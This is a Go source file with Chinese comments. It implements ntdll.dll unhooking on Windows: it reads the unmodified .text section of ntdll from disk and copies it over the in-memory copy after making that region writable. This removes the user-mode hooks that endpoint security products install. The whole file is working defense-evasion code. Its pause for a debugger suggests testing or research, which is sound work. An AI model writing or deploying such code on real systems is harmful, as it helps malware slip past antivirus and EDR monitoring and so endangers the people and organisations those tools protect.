package main

import (
	"bytes"
	"debug/pe"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	IMAGE_DOS_SIGNATURE = 0x5A4D
	IMAGE_NT_SIGNATURE  = 0x00004550
)

type IMAGE_DOS_HEADER struct {
	E_magic  uint16
	_        [58]byte
	E_lfanew int32
}

type IMAGE_NT_HEADER struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader64
}

func UnhookNtdll() error {
	dllPath := "C:\\Windows\\System32\\ntdll.dll"
	pefile, err := pe.Open(dllPath)
	if err != nil {
		return fmt.Errorf("pe 打开失败: %w", err)
	}
	defer pefile.Close()

	var textSection *pe.Section
	for _, s := range pefile.Sections {
		if s.Name == ".text" {
			textSection = s
			break
		}
	}
	if textSection == nil {
		return fmt.Errorf("未找到.text段")
	}

	cleanTextBytes, err := textSection.Data()
	if err != nil {
		return fmt.Errorf(".text段读取失败: %w", err)
	}

	// 修正：增加对空切片的检查，防止 panic
	if len(cleanTextBytes) == 0 {
		return fmt.Errorf(".text段在文件中大小为0，无法执行覆盖")
	}

	var ntdllBase windows.Handle
	moduleNamePtr, err := windows.UTF16PtrFromString("ntdll.dll")
	if err != nil {
		return fmt.Errorf("StringToUTF16Ptr 失败: %w", err)
	}
	err = windows.GetModuleHandleEx(windows.GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, moduleNamePtr, &ntdllBase)
	if err != nil {
		return fmt.Errorf("获取句柄失败: %w", err)
	}

	rtlMoveMemoryAddr, err := windows.GetProcAddress(ntdllBase, "RtlMoveMemory")
	if err != nil {
		return fmt.Errorf("获取 RtlMoveMemory 地址失败: %w", err)
	}

	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdllBase))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return fmt.Errorf("dos无效")
	}

	ntHeader := (*IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(ntdllBase) + uintptr(dosHeader.E_lfanew)))
	if ntHeader.Signature != IMAGE_NT_SIGNATURE {
		return fmt.Errorf("nt头获取失败")
	}

	sectionHeaderAddr := uintptr(ntdllBase) + uintptr(dosHeader.E_lfanew) + 4 + unsafe.Sizeof(ntHeader.FileHeader) + uintptr(ntHeader.FileHeader.SizeOfOptionalHeader)
	sectionHeader := (*pe.SectionHeader32)(unsafe.Pointer(sectionHeaderAddr))

	var hookedTextSectionHeader *pe.SectionHeader32
	for i := 0; i < int(ntHeader.FileHeader.NumberOfSections); i++ {
		nameBytes := sectionHeader.Name[:]
		nameEnd := bytes.IndexByte(nameBytes, 0)
		if nameEnd == -1 {
			nameEnd = len(nameBytes)
		}
		name := string(nameBytes[:nameEnd])
		if name == ".text" {
			hookedTextSectionHeader = sectionHeader
			break
		}
		sectionHeaderAddr += unsafe.Sizeof(pe.SectionHeader32{})
		sectionHeader = (*pe.SectionHeader32)(unsafe.Pointer(sectionHeaderAddr))
	}

	if hookedTextSectionHeader == nil {
		return fmt.Errorf("在内存中未找到 .text 节")
	}

	hookedTextSectionAddr := uintptr(ntdllBase) + uintptr(hookedTextSectionHeader.VirtualAddress)

	var oldProtect uint32
	err = windows.VirtualProtect(hookedTextSectionAddr, uintptr(hookedTextSectionHeader.VirtualSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("内存权限修改失败: %w", err)
	}

	_, _, callErr := syscall.SyscallN(
		rtlMoveMemoryAddr,
		hookedTextSectionAddr,
		uintptr(unsafe.Pointer(&cleanTextBytes[0])),
		uintptr(len(cleanTextBytes)),
	)
	if callErr != 0 {
		// 即使调用失败，也要尝试恢复内存权限
		_ = windows.VirtualProtect(hookedTextSectionAddr, uintptr(hookedTextSectionHeader.VirtualSize), oldProtect, &oldProtect)
		return fmt.Errorf("RtlMoveMemory 调用失败，错误码: %v", callErr)
	}

	fmt.Println("内存已覆盖")

	err = windows.VirtualProtect(hookedTextSectionAddr, uintptr(hookedTextSectionHeader.VirtualSize), oldProtect, &oldProtect)
	if err != nil {
		fmt.Printf("警告: 内存权限恢复失败: %v\n", err)
	}
	return nil
}

func main() {
	err := UnhookNtdll()
	if err != nil {
		fmt.Printf("Unhook 失败: %v\n", err)
		fmt.Println("按回车键退出...")
		fmt.Scanln()
		return
	}
	fmt.Println("Unhook 成功! 程序现在将暂停，请附加调试器进行检查...")
	fmt.Println("检查完毕后，按回车键退出程序。")
	fmt.Scanln() // 程序会在这里阻塞，等待用户输入回车
}